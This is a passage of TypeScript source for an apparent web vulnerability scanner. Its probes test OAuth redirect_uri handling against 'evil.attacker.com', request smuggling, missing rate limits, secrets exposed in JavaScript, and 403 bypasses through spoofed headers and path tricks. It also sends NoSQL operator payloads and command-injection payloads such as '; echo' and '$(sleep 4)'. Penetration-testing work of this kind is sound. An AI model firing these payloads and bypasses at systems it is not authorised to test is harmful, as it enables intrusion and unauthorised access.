      // Test redirect_uri bypass
      const testRedirect = 'https://evil.attacker.com/callback';
      const bypassUrl = new URL(authEndpoint);
      bypassUrl.searchParams.set('response_type', 'code');
      bypassUrl.searchParams.set('client_id', 'test');
      bypassUrl.searchParams.set('redirect_uri', testRedirect);

      try {
        const resp = await fetch(bypassUrl.href, {
          signal: AbortSignal.timeout(6000),
          redirect: 'manual',
        });
        const location = resp.headers.get('location') ?? '';
        // Parse the Location as a URL and check if the HOSTNAME is evil.attacker.com.
        // A CDN HTTP→HTTPS passthrough redirect preserves the full query string including
        // redirect_uri=https://evil.attacker.com/callback — a substring check on location
        // would false-positive on that. We need the actual redirect destination hostname.
        let locationHostname = '';
        try { locationHostname = new URL(location).hostname; } catch { /* malformed */ }
        const isBypass = locationHostname === 'evil.attacker.com';
        if (isBypass) {
          results.push(`REDIRECT_URI BYPASS: Server redirected to ${location}`);
          findings.push({
            title: 'OAuth redirect_uri Bypass',
            severity: 'critical' as const,
            details: `OAuth server accepted evil.attacker.com as redirect_uri and issued a redirect to it. Authorization codes can be stolen.`,
            provenance: 'tool' as const,
            toolName: 'oauth_probe',
            toolOutput: `Location: ${location}`,
          });
        } else {
          results.push(`redirect_uri bypass not confirmed (status ${resp.status}, location: ${location.slice(0, 80)})`);
        }
      } catch { results.push('redirect_uri test error'); }

      return {
        success: true,
        output: [
          `OAuth Probe Results for ${baseUrl}`,
          results.join('\n'),
        ].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'http_smuggling',
    description: 'Timing-based CL.TE HTTP request smuggling detection',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Target URL to test for HTTP request smuggling', required: true },
    ],
    handler: async (context) => {
      const targetUrl = String(context.parameters.url).trim();

      // Get baseline timing with 2 normal POST requests
      const getTime = async (): Promise<number> => {
        const start = Date.now();
        try {
          await fetch(targetUrl, {
            method: 'POST',
            signal: AbortSignal.timeout(10000),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '0' },
            body: '',
          });
        } catch { /* timeout counts */ }
        return Date.now() - start;
      };

      let baseline1 = 0, baseline2 = 0;
      try { baseline1 = await getTime(); } catch { baseline1 = 500; }
      try { baseline2 = await getTime(); } catch { baseline2 = 500; }
      const avgBaseline = (baseline1 + baseline2) / 2;

      // CL.TE probe: Content-Length says 6 bytes, chunked body is 0\r\n\r\n + X
      // The extra "X" is held by TE backend, causing a timeout if smuggling is possible
      const clTeBody = '0\r\n\r\nX';
      let probeTime = 0;
      const probeStart = Date.now();
      try {
        await fetch(targetUrl, {
          method: 'POST',
          signal: AbortSignal.timeout(10000),
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '6',
            'Transfer-Encoding': 'chunked',
          },
          body: clTeBody,
        });
      } catch { /* timeout expected for positive */ }
      probeTime = Date.now() - probeStart;

      const findings: NonNullable<ToolResult['findings']> = [];
      let verdict = '';

      if (probeTime > avgBaseline * 3 && probeTime > 3000) {
        verdict = `POSSIBLE CL.TE smuggling detected — probe took ${probeTime}ms vs avg baseline ${avgBaseline.toFixed(0)}ms`;
        findings.push({
          title: 'Possible HTTP Request Smuggling (CL.TE)',
          severity: 'medium' as const,
          details: `Timing anomaly suggests CL.TE request smuggling. Probe request took ${probeTime}ms vs ${avgBaseline.toFixed(0)}ms baseline (${(probeTime / avgBaseline).toFixed(1)}x). Manual verification required — use smuggler.py or Burp HTTP Request Smuggler extension.`,
          provenance: 'tool' as const,
          toolName: 'http_smuggling',
          toolOutput: `Probe: ${probeTime}ms, Baseline: ${avgBaseline.toFixed(0)}ms`,
        });
      } else {
        verdict = `No timing anomaly — probe ${probeTime}ms vs baseline ${avgBaseline.toFixed(0)}ms. Manual testing recommended.`;
      }

      return {
        success: true,
        output: [
          `HTTP Request Smuggling Test for ${targetUrl}`,
          `Baseline (avg 2 requests): ${avgBaseline.toFixed(0)}ms`,
          `CL.TE probe time: ${probeTime}ms`,
          verdict,
        ].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'rate_limit_check',
    description: 'Verify rate limiting is enforced on authentication endpoints',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Target URL to test rate limiting on', required: true },
      { name: 'method', type: 'string', description: 'HTTP method to use', required: false, default: 'POST' },
      { name: 'count', type: 'number', description: 'Number of requests to send (max 50)', required: false, default: 20 },
    ],
    handler: async (context) => {
      const targetUrl = String(context.parameters.url).trim();
      const method = String(context.parameters.method ?? 'POST').toUpperCase();
      const count = Math.min(Number(context.parameters.count ?? 20), 50);

      const rateLimitHeaders = ['x-ratelimit-limit', 'x-ratelimit-remaining', 'retry-after', 'x-rate-limit', 'ratelimit-limit', 'ratelimit-remaining'];

      const statusCodes: number[] = [];
      const observedRateLimitHeaders = new Set<string>();
      let rateLimitedAt = -1;

      for (let i = 0; i < count; i++) {
        try {
          const resp = await fetch(targetUrl, {
            method,
            signal: AbortSignal.timeout(5000),
            headers: {
              'Content-Type': 'application/json',
              'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
            },
            body: method !== 'GET' ? JSON.stringify({ username: 'test', password: 'test' }) : undefined,
          });
          statusCodes.push(resp.status);
          for (const h of rateLimitHeaders) {
            if (resp.headers.get(h) !== null) observedRateLimitHeaders.add(h);
          }
          if (resp.status === 429 && rateLimitedAt === -1) {
            rateLimitedAt = i + 1;
          }
        } catch { statusCodes.push(0); }
      }

      const findings: NonNullable<ToolResult['findings']> = [];
      const statusSummary = statusCodes.reduce<Record<number, number>>((acc, s) => {
        acc[s] = (acc[s] ?? 0) + 1;
        return acc;
      }, {});

      const has429 = statusCodes.includes(429);
      const hasRateLimitHeaders = observedRateLimitHeaders.size > 0;
      // If every response was 405 Method Not Allowed, the endpoint doesn't accept
      // this HTTP method — we're not testing rate limiting, we're hitting the wrong path.
      const allMethodNotAllowed = statusCodes.length > 0 && statusCodes.every(s => s === 405);

      let verdict = '';
      if (allMethodNotAllowed) {
        verdict = `Endpoint returned HTTP 405 (Method Not Allowed) for all ${count} ${method} requests — this URL does not accept ${method}. Try specifying a login or API endpoint with method="GET" or method="POST" as appropriate.`;
      } else if (has429) {
        verdict = `Rate limiting active — HTTP 429 received at request #${rateLimitedAt}. Subsequent requests: ${Object.entries(statusSummary).map(([s, n]) => `${s}×${n}`).join(', ')}`;
      } else if (hasRateLimitHeaders) {
        verdict = `Rate limit headers present (${Array.from(observedRateLimitHeaders).join(', ')}) but no 429 observed in ${count} requests. Soft rate limiting may be enforced.`;
      } else {
        // Classify the endpoint type from the URL path for an accurate finding title
        const parsedPath = (() => { try { return new URL(targetUrl).pathname.toLowerCase(); } catch { return ''; } })();
        const isAuthPath = /\/(login|auth|signin|signup|register|password|token|oauth|session)/.test(parsedPath);
        const isApiPath = parsedPath.startsWith('/api/');
        const endpointLabel = isAuthPath ? 'Authentication Endpoint' : isApiPath ? 'API Endpoint' : 'Endpoint';

        // When all responses are 200 and method is non-GET, the server may be returning
        // a static/cached page rather than actually processing the request body —
        // common with CDN-fronted sites. Add a caveat so analysts can verify.
        const allOk = statusCodes.every(s => s === 200);
        const likelyPassthrough = allOk && method !== 'GET' && !isAuthPath && !isApiPath;
        const passthruNote = likelyPassthrough
          ? ` NOTE: All responses were 200 on a non-API path — this may be a CDN/proxy serving a cached page rather than processing the ${method} body. Verify by checking response body size matches a GET or by testing a specific API/form endpoint.`
          : '';

        verdict = `MISSING RATE LIMITING — ${count} ${method} requests sent with no 429 and no rate-limit headers. Responses: ${Object.entries(statusSummary).map(([s, n]) => `HTTP ${s} ×${n}`).join(', ')}${passthruNote}`;
        findings.push({
          title: `Missing Rate Limiting on ${endpointLabel}`,
          severity: 'medium' as const,
          details: `${count} rapid ${method} requests to ${targetUrl} received no HTTP 429 and no rate-limit headers. Observed: ${Object.entries(statusSummary).map(([s, n]) => `HTTP ${s} ×${n}`).join(', ')}.${passthruNote} This endpoint may be vulnerable to brute-force attacks.`,
          provenance: 'tool' as const,
          toolName: 'rate_limit_check',
          toolOutput: `Status distribution: ${Object.entries(statusSummary).map(([s, n]) => `${s}×${n}`).join(', ')}. Rate-limit headers seen: none.`,
        });
      }

      return {
        success: true,
        output: [
          `Rate Limit Check for ${targetUrl}`,
          `Method: ${method}, Requests sent: ${count}`,
          `Status codes: ${Object.entries(statusSummary).map(([s, n]) => `HTTP ${s} ×${n}`).join(', ')}`,
          `Rate limit headers seen: ${observedRateLimitHeaders.size > 0 ? Array.from(observedRateLimitHeaders).join(', ') : 'none'}`,
          verdict,
        ].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },

  // ─────────────────────────────────────────────────────────────────────────
  // TIER-2 WEB VULNERABILITY TOOLS
  // ─────────────────────────────────────────────────────────────────────────

  {
    name: 'js_analysis',
    description: 'Fetch and analyze JavaScript files from a target for secrets, API keys, internal endpoints, and sensitive patterns',
    category: 'recon',
    parameters: [
      { name: 'url', type: 'string', description: 'Target URL to extract and analyze JS from', required: true },
    ],
    handler: async (context) => {
      const baseUrl = String(context.parameters.url).trim();
      const results: string[] = [`JS Analysis for ${baseUrl}`];
      const findings: NonNullable<ToolResult['findings']> = [];

      // Secret patterns — each entry: [name, regex, severity]
      const secretPatterns: [string, RegExp, string][] = [
        ['AWS Access Key', /AKIA[0-9A-Z]{16}/g, 'critical'],
        ['AWS Secret Key', /(?:aws[_\-.]?secret[_\-.]?(?:access[_\-.]?)?key)[^\S\r\n]*[=:][^\S\r\n]*['"]?([0-9a-zA-Z/+]{40})['"]?/gi, 'critical'],
        ['GitHub Token', /gh[pousr]_[A-Za-z0-9_]{36,255}/g, 'critical'],
        ['Google API Key', /AIza[0-9A-Za-z\-_]{35}/g, 'high'],
        ['Stripe Live Key', /sk_live_[0-9a-zA-Z]{24,}/g, 'critical'],
        ['Stripe Publishable Key', /pk_live_[0-9a-zA-Z]{24,}/g, 'medium'],
        ['Slack Token', /xox[baprs]-([0-9a-zA-Z]{10,48})/g, 'high'],
        ['JWT Token', /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g, 'medium'],
        ['Private Key Header', /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g, 'critical'],
        ['Hardcoded Password', /(?:password|passwd|pwd)\s*[:=]\s*['"][^'"]{6,64}['"]/gi, 'high'],
        ['Hardcoded Secret', /(?:secret|api[_\-.]?key|auth[_\-.]?token)\s*[:=]\s*['"][^'"]{8,128}['"]/gi, 'high'],
        ['Basic Auth in URL', /https?:\/\/[^:@\s]+:[^@\s]+@/g, 'high'],
        ['Internal IP', /(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})/g, 'info'],
      ];

      // Endpoint extraction — paths that suggest internal APIs
      const endpointRe = /['"`](\/(api|v\d+|internal|admin|graphql|rest|auth|oauth)[^\s'"`]{0,120})['"`]/gi;

      // Step 1: fetch the page, extract <script src="..."> references
      let pageHtml = '';
      try {
        const r = await fetch(baseUrl, { signal: AbortSignal.timeout(8000), headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' } });
        pageHtml = await r.text();
      } catch { return { success: false, error: `Failed to fetch ${baseUrl}` }; }

      const scriptSrcRe = /<script[^>]+src=["']([^"']+)["']/gi;
      const scriptUrls: string[] = [];
      let m: RegExpExecArray | null;
      while ((m = scriptSrcRe.exec(pageHtml)) !== null) {
        try { scriptUrls.push(new URL(m[1], baseUrl).href); } catch { /* skip */ }
      }
      results.push(`Found ${scriptUrls.length} external script(s): ${scriptUrls.slice(0, 3).join(', ')}${scriptUrls.length > 3 ? '…' : ''}`);

      // Also check inline script content
      const inlineRe = /<script(?:[^>]*)?>([\s\S]*?)<\/script>/gi;
      const inlineBlocks: string[] = [];
      while ((m = inlineRe.exec(pageHtml)) !== null) inlineBlocks.push(m[1]);

      // Step 2: fetch and analyse each JS file (cap at 5)
      const allContent = inlineBlocks.join('\n');
      const jsTexts: { url: string; content: string }[] = [{ url: `${baseUrl} (inline)`, content: allContent }];
      for (const jsUrl of scriptUrls.slice(0, 5)) {
        try {
          const r = await fetch(jsUrl, { signal: AbortSignal.timeout(8000), headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' } });
          if (r.ok) jsTexts.push({ url: jsUrl, content: await r.text() });
        } catch { /* skip */ }
      }
      results.push(`Analysing ${jsTexts.length} script block(s)…`);

      const secretsFound = new Set<string>();
      const endpointsFound = new Set<string>();

      for (const { url: jsUrl, content } of jsTexts) {
        // Secret scan
        for (const [name, re, severity] of secretPatterns) {
          re.lastIndex = 0;
          const hits = content.match(re);
          if (hits) {
            for (const hit of hits) {
              const key = `${name}:${hit.slice(0, 40)}`;
              if (!secretsFound.has(key)) {
                secretsFound.add(key);
                results.push(`  [${severity.toUpperCase()}] ${name} in ${jsUrl.split('/').pop()}: ${hit.slice(0, 60)}…`);
                findings.push({
                  title: `Secret Exposed in JavaScript: ${name}`,
                  severity: severity as 'info' | 'low' | 'medium' | 'high' | 'critical',
                  details: `Found pattern matching ${name} in ${jsUrl}. Value: ${hit.slice(0, 80)}`,
                  provenance: 'tool' as const,
                  toolName: 'js_analysis',
                  toolOutput: hit.slice(0, 120),
                });
              }
            }
          }
        }

        // Endpoint extraction
        endpointRe.lastIndex = 0;
        while ((m = endpointRe.exec(content)) !== null) {
          const ep = m[1];
          if (!endpointsFound.has(ep)) {
            endpointsFound.add(ep);
          }
        }
      }

      if (endpointsFound.size > 0) {
        const eps = Array.from(endpointsFound).slice(0, 20);
        results.push(`\nInternal endpoints found (${endpointsFound.size}):\n${eps.map(e => `  ${e}`).join('\n')}`);
        if (endpointsFound.size > 0) {
          findings.push({
            title: 'Internal API Endpoints in JavaScript',
            severity: 'medium' as const,
            details: `Found ${endpointsFound.size} internal endpoint path(s) hardcoded in JavaScript: ${eps.slice(0, 8).join(', ')}`,
            provenance: 'tool' as const,
            toolName: 'js_analysis',
            toolOutput: eps.join(', '),
          });
        }
      }

      if (secretsFound.size === 0 && endpointsFound.size === 0) {
        results.push('No secrets or internal endpoints found in analysed scripts.');
      }

      return { success: true, output: results.join('\n'), findings: findings.length > 0 ? findings : undefined };
    },
  },

  {
    name: 'bypass_403',
    description: 'Try common techniques to bypass 403 Forbidden responses: header overrides, path variants, method switching',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Full URL that returned 403 to try to bypass', required: true },
    ],
    handler: async (context) => {
      const url = String(context.parameters.url).trim();
      let parsed: URL;
      try { parsed = new URL(url); } catch { return { success: false, error: `Invalid URL: ${url}` }; }

      const path = parsed.pathname;
      const origin = parsed.origin;
      const results: string[] = [`403 Bypass attempts for ${url}`];
      const findings: NonNullable<ToolResult['findings']> = [];

      // Get baseline 403
      let baselineStatus = 0;
      try {
        const r = await fetch(url, { signal: AbortSignal.timeout(5000), redirect: 'manual' });
        baselineStatus = r.status;
      } catch { /* continue */ }
      results.push(`Baseline: HTTP ${baselineStatus}`);

      // Define all bypass attempts
      type Attempt = { label: string; fetchUrl: string; method?: string; extraHeaders?: Record<string, string> };
      const attempts: Attempt[] = [
        // Header-based bypasses
        { label: 'X-Original-URL override', fetchUrl: origin + '/', extraHeaders: { 'X-Original-URL': path } },
        { label: 'X-Rewrite-URL override', fetchUrl: origin + '/', extraHeaders: { 'X-Rewrite-URL': path } },
        { label: 'X-Custom-IP-Authorization: 127.0.0.1', fetchUrl: url, extraHeaders: { 'X-Custom-IP-Authorization': '127.0.0.1' } },
        { label: 'X-Forwarded-For: 127.0.0.1', fetchUrl: url, extraHeaders: { 'X-Forwarded-For': '127.0.0.1' } },
        { label: 'X-Forwarded-For: localhost', fetchUrl: url, extraHeaders: { 'X-Forwarded-For': 'localhost' } },
        { label: 'X-Real-IP: 127.0.0.1', fetchUrl: url, extraHeaders: { 'X-Real-IP': '127.0.0.1' } },
        { label: 'X-ProxyUser-Ip: 127.0.0.1', fetchUrl: url, extraHeaders: { 'X-ProxyUser-Ip': '127.0.0.1' } },
        // Path variant bypasses
        { label: 'Trailing slash', fetchUrl: origin + path + '/' },
        { label: 'Trailing dot', fetchUrl: origin + path + '.' },
        { label: 'Double slash', fetchUrl: origin + '//' + path.replace(/^\//, '') },
        { label: 'URL-encoded slash prefix', fetchUrl: origin + '/%2F' + path.replace(/^\//, '') },
        { label: 'Semicolon prefix', fetchUrl: origin + '/;' + path.replace(/^\//, '') },
        { label: 'Dot in path', fetchUrl: origin + path + '/.' },
        // Method switching
        { label: 'POST instead of GET', fetchUrl: url, method: 'POST' },
        { label: 'HEAD instead of GET', fetchUrl: url, method: 'HEAD' },
      ];

      const bypasses: string[] = [];
      for (const attempt of attempts) {
        try {
          const headers: Record<string, string> = {
            'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)',
            ...attempt.extraHeaders,
          };
          const r = await fetch(attempt.fetchUrl, {
            method: attempt.method ?? 'GET',
            signal: AbortSignal.timeout(5000),
            redirect: 'manual',
            headers,
          });
          const status = r.status;
          const note = (status >= 200 && status < 300) ? '✓ BYPASSED' : status === 301 || status === 302 ? '→ redirect' : '';
          results.push(`  ${attempt.label}: HTTP ${status} ${note}`);
          if (status >= 200 && status < 300) {
            bypasses.push(`${attempt.label} (HTTP ${status})`);
            const reqHeaders = Object.entries({ ...attempt.extraHeaders }).map(([k, v]) => `${k}: ${v}`).join('\n');
            const curlHeaders = Object.entries({ ...attempt.extraHeaders }).map(([k, v]) => `-H '${k}: ${v}'`).join(' ');
            const curl = `curl -sk ${curlHeaders} '${attempt.fetchUrl}'`.replace(/\s+/g, ' ').trim();
            findings.push({
              title: '403 Access Control Bypass',
              severity: 'high' as const,
              details: `Bypassed 403 on ${url} using: ${attempt.label}. Returned HTTP ${status}.\n\nVerify:\n${curl}`,
              provenance: 'tool' as const,
              toolName: 'bypass_403',
              toolOutput: `${attempt.label} → HTTP ${status}`,
              httpRequest: `${attempt.method ?? 'GET'} ${attempt.fetchUrl}\nHost: ${parsed.hostname}\n${reqHeaders}`,
              httpResponse: `HTTP/1.1 ${status}`,
            });
          }
        } catch { /* skip */ }
      }

      if (bypasses.length === 0) results.push('\nNo bypasses found — 403 appears enforced.');
      else results.push(`\n${bypasses.length} bypass(es) found: ${bypasses.join(', ')}`);

      return { success: true, output: results.join('\n'), findings: findings.length > 0 ? findings : undefined };
    },
  },

  {
    name: 'nosql_injection',
    description: 'Test URL parameters and JSON POST bodies for NoSQL (MongoDB/Mongoose) injection via operator payloads',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Target URL (query params tested automatically)', required: true },
      { name: 'param', type: 'string', description: 'Specific parameter to test', required: false, default: '' },
    ],
    handler: async (context) => {
      const rawUrl = String(context.parameters.url).trim();
      const paramOverride = String(context.parameters.param ?? '').trim();

      let baseUrl: URL;
      try { baseUrl = new URL(rawUrl); } catch { return { success: false, error: `Invalid URL: ${rawUrl}` }; }

      const params = paramOverride ? [paramOverride] : Array.from(baseUrl.searchParams.keys());
      const commonParams = ['user', 'username', 'email', 'password', 'id', 'search', 'query', 'filter', 'name'];
      const paramsToTest = params.length > 0 ? params : commonParams;

      const results: string[] = [`NoSQL Injection test on ${rawUrl}`];
      const findings: NonNullable<ToolResult['findings']> = [];

      // MongoDB operator payloads for GET params (bracket notation)
      const getPayloads = [
        { suffix: '[$ne]', value: 'invalid_xyz_99', name: '$ne operator (not-equal)' },
        { suffix: '[$gt]', value: '', name: '$gt operator (greater-than empty)' },
        { suffix: '[$regex]', value: '.*', name: '$regex wildcard match' },
        { suffix: '[$exists]', value: 'true', name: '$exists operator' },
        { suffix: '[$nin][]', value: 'x', name: '$nin operator' },
      ];

      // Error strings indicating MongoDB/NoSQL
      const errorMarkers = ['mongod', 'mongodb', 'mongoose', 'castError', 'bsontype', '$where', 'objectid', 'invalid bson', 'mongo error'];

      // Step 1: Baseline responses for each param
      const baselines = new Map<string, { length: number; status: number }>();
      for (const p of paramsToTest.slice(0, 8)) {
        try {
          const t = new URL(rawUrl);
          t.searchParams.set(p, 'safe_baseline_value');
          const r = await fetch(t.toString(), { signal: AbortSignal.timeout(5000) });
          const body = await r.text();
          baselines.set(p, { length: body.length, status: r.status });
        } catch { /* skip */ }
      }

      // Step 2: Test GET params with bracket operators
      for (const p of paramsToTest.slice(0, 8)) {
        for (const pl of getPayloads) {
          try {
            const t = new URL(rawUrl);
            // Remove normal param, add operator variant
            t.searchParams.delete(p);
            const testUrl = t.toString() + (t.search ? '&' : '?') + `${encodeURIComponent(p + pl.suffix)}=${encodeURIComponent(pl.value)}`;
            const r = await fetch(testUrl, { signal: AbortSignal.timeout(5000) });
            const body = await r.text();
            const bodyLower = body.toLowerCase();
            const baseline = baselines.get(p);

            const hasError = errorMarkers.some(e => bodyLower.includes(e));
            // WAF blocks (403/429/406) triggered by injection syntax are NOT injection evidence —
            // they prove the WAF is working, not that the backend is vulnerable.
            const isWafBlock = r.status === 403 || r.status === 429 || r.status === 406;
            // Only flag meaningful evidence:
            //   1. NoSQL error text in the response body
            //   2. Payload caused a previously-blocked endpoint to return 2xx (auth bypass)
            //   3. Same 200 status but ≥30% more data returned (additional records leaked)
            const wasBlocked = (baseline?.status ?? 0) >= 400;
            const isNowOpen = r.status >= 200 && r.status < 300;
            const isUnblocked = wasBlocked && isNowOpen;
            const isDataLeak = r.status === 200 && baseline?.status === 200 &&
              body.length > (baseline?.length ?? 0) * 1.3 && body.length - (baseline?.length ?? 0) > 500;

            results.push(`  [${p}] ${pl.name}: HTTP ${r.status}${isWafBlock ? ' (WAF block — skip)' : ''}${hasError ? ' ← NoSQL ERROR' : ''}${isUnblocked ? ' ← UNBLOCKED' : ''}${isDataLeak ? ' ← DATA LEAK' : ''}`);
            if (hasError) {
              const curl = `curl -sk '${testUrl}'`;
              findings.push({
                title: `NoSQL Injection (Error-Based) — ${p}`,
                severity: 'critical' as const,
                details: `Parameter "${p}" with ${pl.name} triggered NoSQL error markers in response.\n\nVerify:\n${curl}`,
                provenance: 'tool' as const, toolName: 'nosql_injection',
                toolOutput: `${pl.name} → NoSQL error in response`,
                httpRequest: `GET ${testUrl}\nHost: ${baseUrl.hostname}`,
                httpResponse: `HTTP/1.1 ${r.status}\n\n${body.slice(0, 200)}`,
              });
            } else if (isUnblocked || isDataLeak) {
              const reason = isUnblocked ? `endpoint unblocked: baseline ${baseline?.status}→${r.status}` : `data leak: ${body.length - (baseline?.length ?? 0)} extra bytes`;
              const curl = `curl -sk '${testUrl}'`;
              findings.push({
                title: `Possible NoSQL Injection (Behavioral) — ${p}`,
                severity: 'medium' as const,
                details: `Parameter "${p}" with ${pl.name}: ${reason}. Suggests NoSQL operator injection affected query logic. Manual verification required.\n\nVerify:\n${curl}`,
                provenance: 'tool' as const, toolName: 'nosql_injection',
                toolOutput: `${pl.name} → ${reason}`,
                httpRequest: `GET ${testUrl}\nHost: ${baseUrl.hostname}`,
                httpResponse: `HTTP/1.1 ${r.status}\n\n${body.slice(0, 200)}`,
              });
            }
          } catch { /* skip */ }
        }
      }

      // Step 3: Test JSON POST body
      const jsonPayloads = [
        { body: { username: { $ne: null }, password: { $ne: null } }, name: 'Auth bypass ($ne null)' },
        { body: { username: { $regex: '.*', $options: 'i' } }, name: 'Regex wildcard username' },
        { body: { $where: '1==1' }, name: '$where JS injection' },
      ];
      for (const jp of jsonPayloads) {
        try {
          const r = await fetch(rawUrl, {
            method: 'POST',
            signal: AbortSignal.timeout(6000),
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' },
            body: JSON.stringify(jp.body),
          });
          const body = await r.text();
          const bodyLower = body.toLowerCase();
          const hasError = errorMarkers.some(e => bodyLower.includes(e));
          const looks200 = r.status >= 200 && r.status < 300;
          const ct = r.headers.get('content-type') ?? '';
          // Reject false positives: if the response is HTML and looks like a homepage/SPA shell,
          // the endpoint is not an API — it's just returning the front page regardless of input.
          const isHtmlShell = ct.includes('html') && (body.includes('<!DOCTYPE html') || body.includes('<html'));
          const isJsonApi = ct.includes('json');
          const couldBeAuthEndpoint = isJsonApi || hasError;
          results.push(`  POST JSON [${jp.name}]: HTTP ${r.status} (${ct.split(';')[0]})${hasError ? ' — NoSQL error!' : ''}${isHtmlShell && !hasError ? ' (HTML shell — not an API endpoint)' : ''}`);
          if (hasError || (looks200 && couldBeAuthEndpoint && jp.name.includes('bypass'))) {
            const bodyStr = JSON.stringify(jp.body);
            const curl = `curl -sk -X POST '${rawUrl}' -H 'Content-Type: application/json' -d '${bodyStr.replace(/'/g, "'\\''")}'`;
            findings.push({
              title: `NoSQL Injection via JSON POST — ${jp.name}`,
              severity: 'critical' as const,
              details: `JSON POST body with ${jp.name} returned HTTP ${r.status} (${ct.split(';')[0]})${hasError ? ' with NoSQL error markers' : ' — JSON API endpoint accepted operator payload'}.\n\nVerify:\n${curl}`,
              provenance: 'tool' as const, toolName: 'nosql_injection',
              toolOutput: `${jp.name} → HTTP ${r.status} (${ct.split(';')[0]})`,
              httpRequest: `POST ${rawUrl}\nContent-Type: application/json\n\n${bodyStr}`,
              httpResponse: `HTTP/1.1 ${r.status}\n\n${body.slice(0, 300)}`,
            });
          }
        } catch { /* skip */ }
      }

      if (findings.length === 0) results.push('No NoSQL injection indicators found.');
      return { success: true, output: results.join('\n'), findings: findings.length > 0 ? findings : undefined };
    },
  },

  {
    name: 'command_injection',
    description: 'Test URL parameters for OS command injection via error-based and time-based blind detection',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Target URL with parameters to test', required: true },
      { name: 'param', type: 'string', description: 'Specific parameter to test; omit to test all', required: false, default: '' },
    ],
    handler: async (context) => {
      const rawUrl = String(context.parameters.url).trim();
      const paramOverride = String(context.parameters.param ?? '').trim();

      let baseUrl: URL;
      try { baseUrl = new URL(rawUrl); } catch { return { success: false, error: `Invalid URL: ${rawUrl}` }; }

      const allParams = Array.from(baseUrl.searchParams.keys());
      const paramsToTest = paramOverride ? [paramOverride] : (allParams.length > 0 ? allParams : ['q', 'cmd', 'exec', 'id', 'host', 'input', 'ping', 'search']);

      const results: string[] = [`Command Injection test on ${rawUrl}`];
      const findings: NonNullable<ToolResult['findings']> = [];

      // Payloads: [payload, type, expected-output-marker]
      type CmdPayload = { payload: string; name: string; kind: 'output' | 'time'; marker?: string; delayMs?: number };
      const payloads: CmdPayload[] = [
        // Output-based — look for command output in response
        { payload: '; echo t3mp3st_rce_confirm', name: 'Semicolon echo (Unix)', kind: 'output', marker: 't3mp3st_rce_confirm' },
        { payload: '| echo t3mp3st_rce_confirm', name: 'Pipe echo (Unix)', kind: 'output', marker: 't3mp3st_rce_confirm' },
        { payload: '`echo t3mp3st_rce_confirm`', name: 'Backtick echo (Unix)', kind: 'output', marker: 't3mp3st_rce_confirm' },
        { payload: '$(echo t3mp3st_rce_confirm)', name: 'Dollar-paren echo (Unix)', kind: 'output', marker: 't3mp3st_rce_confirm' },
        { payload: '& echo t3mp3st_rce_confirm', name: 'Ampersand echo (Windows)', kind: 'output', marker: 't3mp3st_rce_confirm' },
        // Error-based — look for shell error messages in response
        { payload: '; invalid_cmd_xyz_99', name: 'Invalid command (triggers shell error)', kind: 'output', marker: '' },
        // Time-based blind — measure response delay
        { payload: '; sleep 4', name: 'Sleep 4s (Unix)', kind: 'time', delayMs: 3500 },
        { payload: '| sleep 4', name: 'Pipe sleep 4s (Unix)', kind: 'time', delayMs: 3500 },
        { payload: '$(sleep 4)', name: 'Dollar-paren sleep 4s', kind: 'time', delayMs: 3500 },
        { payload: '%0a sleep 4', name: 'Newline sleep (URL)', kind: 'time', delayMs: 3500 },
      ];

      const shellErrors = ['sh:', 'bash:', '/bin/sh', 'command not found', 'is not recognized', 'cannot find', 'no such file', 'permission denied'];

      // Measure baseline response time
      let baselineMs = 1500;
      try {
        const t0 = Date.now();
        const u = new URL(rawUrl);
        if (paramsToTest[0]) u.searchParams.set(paramsToTest[0], 'safe_value');
        await fetch(u.toString(), { signal: AbortSignal.timeout(8000) });
        baselineMs = Date.now() - t0;
      } catch { /* continue */ }
      results.push(`Baseline response time: ${baselineMs}ms`);

      for (const param of paramsToTest.slice(0, 6)) {
        for (const pl of payloads) {
          try {
            const testUrl = new URL(rawUrl);
            testUrl.searchParams.set(param, pl.payload);
            const urlStr = testUrl.toString();

            if (pl.kind === 'time') {
              const timeoutMs = (pl.delayMs ?? 3000) + baselineMs + 2000;
              const t0 = Date.now();
              await fetch(urlStr, { signal: AbortSignal.timeout(timeoutMs), headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' } });
              const elapsed = Date.now() - t0;
              const triggered = elapsed >= baselineMs + (pl.delayMs ?? 3000) - 500;
              results.push(`  [${param}] ${pl.name}: ${elapsed}ms${triggered ? ' ← DELAY DETECTED' : ''}`);
              if (triggered) {
                const curl = `curl -sk -w '\\nTime: %{time_total}s\\n' '${urlStr}'`;
                findings.push({
                  title: `Blind Command Injection (Time-Based) — ${param}`,
                  severity: 'critical' as const,
                  details: `Parameter "${param}" caused a ${elapsed}ms response when baseline was ${baselineMs}ms using payload "${pl.payload}". Time delta (${elapsed - baselineMs}ms) exceeds sleep duration, strongly suggesting OS command injection.\n\nVerify (expect ~${Math.round((pl.delayMs ?? 3000) / 1000)}s delay):\n${curl}`,
                  provenance: 'tool' as const, toolName: 'command_injection',
                  toolOutput: `${pl.name} delay: ${elapsed}ms (baseline ${baselineMs}ms, Δ${elapsed - baselineMs}ms)`,
